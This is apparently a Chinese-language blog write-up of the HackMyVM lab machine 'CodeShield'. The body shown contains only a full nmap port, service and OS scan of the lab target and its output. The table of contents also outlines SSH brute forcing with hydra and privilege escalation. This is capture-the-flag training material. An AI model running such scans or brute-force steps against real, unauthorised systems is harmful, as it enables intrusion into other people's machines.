<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>HackMyVM-CodeShield | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="难度:Easy kali:192.168.56.104 靶机:192.168.56.154 信息收集端口扫描┌──(root㉿kali2)-[~&#x2F;Desktop] └─# nmap 192.168.56.154 -sV -A -p- Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-04-17 10:04 CST Nmap scan report">
<meta property="og:type" content="article">
<meta property="og:title" content="HackMyVM-CodeShield">
<meta property="og:url" content="https://tao0845.github.io/posts/3e3f7c7d/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="难度:Easy kali:192.168.56.104 靶机:192.168.56.154 信息收集端口扫描┌──(root㉿kali2)-[~&#x2F;Desktop] └─# nmap 192.168.56.154 -sV -A -p- Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-04-17 10:04 CST Nmap scan report">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/17/OmXJsG.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/17/OmXRo1.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/17/OmXteI.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/17/OmX4GD.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/17/OmXD3F.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/17/OmXVrK.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/17/OmXYQa.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/17/OmXf3S.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/17/OmXf3S.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/17/OmXjtC.png">
<meta property="article:published_time" content="2024-04-17T02:02:33.646Z">
<meta property="article:modified_time" content="2024-06-07T05:26:52.613Z">
<meta property="article:author" content="ta0">
<meta property="article:tag" content="pdf">
<meta property="article:tag" content="kdbx">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/04/17/OmXJsG.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">115</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">14</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">187</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">ftp匿名登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.1.2.</span> <span class="toc-text">smb枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.3.</span> <span class="toc-text">web信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.4.</span> <span class="toc-text">目录扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.</span> <span class="toc-text">ssh爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">字典生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.2.</span> <span class="toc-text">hydra爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E5%B0%9D%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">横向尝试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83root"><span class="toc-number">1.4.</span> <span class="toc-text">提权root</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/3e3f7c7d/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HackMyVM-CodeShield</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-04-17 10:02:33" itemprop="dateCreated datePublished" datetime="2024-04-17T10:02:33+08:00">2024-04-17</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-06-07 13:26:52" itemprop="dateModified" datetime="2024-06-07T13:26:52+08:00">2024-06-07</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">4.1k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">24m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/HackMyVM/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">HackMyVM</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/pdf/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">pdf</span></a><a class="tag-item" href="/tags/kdbx/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">kdbx</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:Easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.154</strong></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.154 -sV -A -p-</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-17 <span class="token number">10</span>:04 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.154
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00077s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65521</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">21</span>/tcp    <span class="token function">open</span>  <span class="token function">ftp</span>           vsftpd <span class="token number">3.0</span>.5
<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span> -rw-rw-r--    <span class="token number">1</span> <span class="token number">1002</span>     <span class="token number">1002</span>      <span class="token number">2349914</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> CodeShield_pitch_deck.pdf
<span class="token operator">|</span> -rw-rw-r--    <span class="token number">1</span> <span class="token number">1003</span>     <span class="token number">1003</span>        <span class="token number">67520</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Information_Security_Policy.pdf
<span class="token operator">|</span>_-rw-rw-r--    <span class="token number">1</span> <span class="token number">1004</span>     <span class="token number">1004</span>       <span class="token number">226435</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> The_2023_weak_password_report.pdf
<span class="token operator">|</span> ftp-syst: 
<span class="token operator">|</span>   STAT: 
<span class="token operator">|</span> FTP server status:
<span class="token operator">|</span>      Connected to ::ffff:192.168.56.104
<span class="token operator">|</span>      Logged <span class="token keyword">in</span> as <span class="token function">ftp</span>
<span class="token operator">|</span>      TYPE: ASCII
<span class="token operator">|</span>      No session bandwidth limit
<span class="token operator">|</span>      Session <span class="token function">timeout</span> <span class="token keyword">in</span> seconds is <span class="token number">300</span>
<span class="token operator">|</span>      Control connection is plain text
<span class="token operator">|</span>      Data connections will be plain text
<span class="token operator">|</span>      At session startup, client count was <span class="token number">1</span>
<span class="token operator">|</span>      vsFTPd <span class="token number">3.0</span>.5 - secure, fast, stable
<span class="token operator">|</span>_End of status
<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>           OpenSSH <span class="token number">6</span>.0p1 Debian <span class="token number">4</span>+deb7u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">32</span>:14:67:32:02:7a:b6:e4:7f:a7:22:0b:02:fd:ee:07 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">34</span>:e4:d0:5d:bd:bc:9e:3f:4c:f9:1e:7d:3c:60:ce:6e <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> ef:3c:ff:f9:9a:a3:aa:7d:5a:82:73:b9:8c:b8:97:04 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">25</span>/tcp    <span class="token function">open</span>  smtp          Postfix smtpd
<span class="token operator">|</span>_smtp-commands: SMTP: EHLO <span class="token number">521</span> <span class="token number">5.5</span>.1 Protocol error<span class="token punctuation">\</span>x0D
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          nginx
<span class="token operator">|</span>_http-title: Did not follow redirect to https://192.168.56.154/
<span class="token number">110</span>/tcp   <span class="token function">open</span>  pop3          Dovecot pop3d
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_pop3-capabilities: CAPA SASL RESP-CODES STLS AUTH-RESP-CODE UIDL PIPELINING TOP
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token number">143</span>/tcp   <span class="token function">open</span>  imap          Dovecot imapd <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_imap-capabilities: OK post-login LITERAL+ <span class="token function">more</span> ENABLE Pre-login IDLE ID listed have capabilities LOGINDISABLEDA0001 SASL-IR LOGIN-REFERRALS IMAP4rev1 STARTTLS
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token number">443</span>/tcp   <span class="token function">open</span>  ssl/http      nginx
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_http-title: CodeShield - Home
<span class="token operator">|</span> http-robots.txt: <span class="token number">1</span> disallowed entry 
<span class="token operator">|</span>_/
<span class="token number">465</span>/tcp   <span class="token function">open</span>  ssl/smtp      Postfix smtpd
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: failed to receive data
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token number">587</span>/tcp   <span class="token function">open</span>  smtp          Postfix smtpd
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token operator">|</span>_smtp-commands: mail.codeshield.hmv, PIPELINING, SIZE <span class="token number">15728640</span>, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token number">993</span>/tcp   <span class="token function">open</span>  imaps?
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token number">995</span>/tcp   <span class="token function">open</span>  pop3s?
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token operator">|</span>_pop3-capabilities: CAPA SASL<span class="token punctuation">(</span>PLAIN LOGIN<span class="token punctuation">)</span> RESP-CODES UIDL AUTH-RESP-CODE <span class="token environment constant">USER</span> PIPELINING TOP
<span class="token number">2222</span>/tcp  <span class="token function">open</span>  <span class="token function">ssh</span>           OpenSSH <span class="token number">6</span>.0p1 Debian <span class="token number">4</span>+deb7u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">32</span>:14:67:32:02:7a:b6:e4:7f:a7:22:0b:02:fd:ee:07 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">34</span>:e4:d0:5d:bd:bc:9e:3f:4c:f9:1e:7d:3c:60:ce:6e <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> ef:3c:ff:f9:9a:a3:aa:7d:5a:82:73:b9:8c:b8:97:04 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">3389</span>/tcp  <span class="token function">open</span>  ms-wbt-server xrdp
<span class="token number">22222</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>           OpenSSH <span class="token number">8</span>.9p1 Ubuntu 3ubuntu0.3 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> 2a:49:28:84:25:99:62:e8:29:68:88:d6:36:be:8e:d6 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">20</span>:9f:5b:3f:52:eb:a9:60:27:39:3b:e7:d8:17:8d:70 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
MAC Address: 08:00:27:61:49:1F <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
No exact OS matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="token punctuation">)</span>.
TCP/IP fingerprint:
OS:SCAN<span class="token punctuation">(</span>V<span class="token operator">=</span><span class="token number">7</span>.94SVN%E<span class="token operator">=</span><span class="token number">4</span>%D<span class="token operator">=</span><span class="token number">4</span>/17%OT<span class="token operator">=</span><span class="token number">21</span>%CT<span class="token operator">=</span><span class="token number">1</span>%CU<span class="token operator">=</span><span class="token number">30783</span>%PV<span class="token operator">=</span>Y%DS<span class="token operator">=</span><span class="token number">1</span>%DC<span class="token operator">=</span>D%G<span class="token operator">=</span>Y%M<span class="token operator">=</span>08002
OS:7%TM<span class="token operator">=</span>661F2E73%P<span class="token operator">=</span>x86_64-pc-linux-gnu<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span><span class="token number">103</span>%GCD<span class="token operator">=</span><span class="token number">1</span>%ISR<span class="token operator">=</span>10A%TI<span class="token operator">=</span>Z%CI<span class="token operator">=</span>Z%I
OS:I<span class="token operator">=</span>I%TS<span class="token operator">=</span>A<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span><span class="token number">103</span>%GCD<span class="token operator">=</span><span class="token number">2</span>%ISR<span class="token operator">=</span>10A%TI<span class="token operator">=</span>Z%CI<span class="token operator">=</span>Z%II<span class="token operator">=</span>I%TS<span class="token operator">=</span>A<span class="token punctuation">)</span>OPS<span class="token punctuation">(</span>O1<span class="token operator">=</span>M5B4ST11NW7
OS:%O2<span class="token operator">=</span>M5B4ST11NW7%O3<span class="token operator">=</span>M5B4NNT11NW7%O4<span class="token operator">=</span>M5B4ST11NW7%O5<span class="token operator">=</span>M5B4ST11NW7%O6<span class="token operator">=</span>M5B4ST1
OS:1<span class="token punctuation">)</span>WIN<span class="token punctuation">(</span>W1<span class="token operator">=</span>FE88%W2<span class="token operator">=</span>FE88%W3<span class="token operator">=</span>FE88%W4<span class="token operator">=</span>FE88%W5<span class="token operator">=</span>FE88%W6<span class="token operator">=</span>FE88<span class="token punctuation">)</span>ECN<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">81</span>%
OS:W<span class="token operator">=</span>FAF0%O<span class="token operator">=</span>M5B4NNSNW7%CC<span class="token operator">=</span>Y%Q<span class="token operator">=</span><span class="token punctuation">)</span>T1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">81</span>%S<span class="token operator">=</span>O%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AS%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T2<span class="token punctuation">(</span>R<span class="token operator">=</span>
OS:N<span class="token punctuation">)</span>T3<span class="token punctuation">(</span>R<span class="token operator">=</span>N<span class="token punctuation">)</span>T4<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">81</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T5<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">81</span>%W<span class="token operator">=</span>
OS:0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T6<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">81</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T
OS:7<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">81</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>U1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>N%T<span class="token operator">=</span><span class="token number">81</span>%IPL<span class="token operator">=</span><span class="token number">164</span>%UN
OS:<span class="token operator">=</span><span class="token number">0</span>%RIPL<span class="token operator">=</span>G%RID<span class="token operator">=</span>G%RIPCK<span class="token operator">=</span>G%RUCK<span class="token operator">=</span>G%RUD<span class="token operator">=</span>G<span class="token punctuation">)</span>IE<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DFI<span class="token operator">=</span>N%T<span class="token operator">=</span><span class="token number">81</span>%CD<span class="token operator">=</span>S<span class="token punctuation">)</span>

Network Distance: <span class="token number">1</span> hop
Service Info: Hosts: -mail.codeshield.hmv,  mail.codeshield.hmv<span class="token punctuation">;</span> OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.77</span> ms <span class="token number">192.168</span>.56.154

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
